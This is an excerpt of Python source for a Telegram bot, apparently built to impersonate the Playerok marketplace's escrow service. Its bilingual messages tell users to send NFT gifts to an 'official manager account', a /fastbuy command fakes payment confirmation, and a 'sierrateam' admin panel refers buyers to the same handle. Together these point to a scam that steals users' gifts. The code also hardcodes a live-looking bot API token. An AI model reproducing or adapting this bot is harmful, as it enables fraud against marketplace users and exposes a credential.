...
bot = Bot(token="7160785071:AAFeUvvBQ0U5QGoj49pWafLk4Gh_cM1TopA")
dp = Dispatcher()
...
main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    ...
    [InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/Playerok_GiftSuport")],
    ...
    if deal_id:
        ...
        if deal["type"] == "deal_gift":
            text_ru = (
                ...
                f"NFT ожидает отправки на официальный аккаунт менеджера - @Playerok_GiftSuport n\n"
            ...
            text_en = (
                ...
                f"NFT must be sent to the official manager account — @Playerok_GiftSuport\n\n"
                f"⚠️ Attention:\n"
...
async def sierrateam_read_callback(callback: CallbackQuery):
    ...
    await safe_edit_message(
        callback,
        "👑 Админ-панель\n\nВыберите действие:\n\n🔓 Полный доступ: ❌ Отсутствует\n💼 Может подтверждать: Только подарки\n\n💎 Для получения полного доступа свяжитесь с @Playerok_GiftSuport",
...
async def fastbuy_command(message: Message):
    ...
    if deal["type"] == "deal_gift":
        text_ru = (
            f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
            f"📜 Предмет: {deal['description']}\n\n"
            f"NFT ожидает отправки на официальный аккаунт менеджера - @Playerok_GiftSuport\n\n"
            f"⚠️ ВАЖНО:\n"
